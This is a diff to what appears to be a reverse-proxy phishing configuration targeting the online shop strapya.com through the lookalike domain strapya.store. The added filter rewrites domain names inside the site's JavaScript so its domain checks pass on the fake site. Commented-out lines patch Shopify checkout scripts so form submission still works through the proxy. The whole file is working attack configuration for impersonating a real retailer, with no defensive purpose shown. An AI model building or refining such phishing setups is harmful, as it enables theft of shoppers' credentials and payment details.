@@ -28,6 +28,13 @@ proxy_hosts:
 #  - {phish_sub: 'wwwg', orig_sub: 'www', domain: 'gstatic.com', session: true, is_landing: false, auto_filter: true }
 
 sub_filters:
+  # 替换 JavaScript 中的域名检查
+  - triggers_on: 'www.strapya.com'
+    orig_sub: 'www'
+    domain: 'strapya.com'
+    search: 'strapya\.com'
+    replace: 'strapya.store'
+    mimes: [ 'text/javascript', 'application/javascript' ]
 #  hack提交按钮 （解决不能重复提交问题）
 #- {triggers_on: 'cdn.shopify.com', orig_sub: 'cdn', domain: 'shopify.com', search: '\.behavior===["'']block["'']\),', replace: '.behavior===(!top.window.hack?"unblock":"block")),', mimes: ['text/javascript','application/javascript', 'application/x-javascript']}
 #- {triggers_on: 'cdn.shopify.com', orig_sub: 'cdn', domain: 'shopify.com', search: '\=\>["'']block["'']\=\=\=', replace: '=>(!top.window.hack?"unblock":"block")===', mimes: ['text/javascript','application/javascript', 'application/x-javascript']}
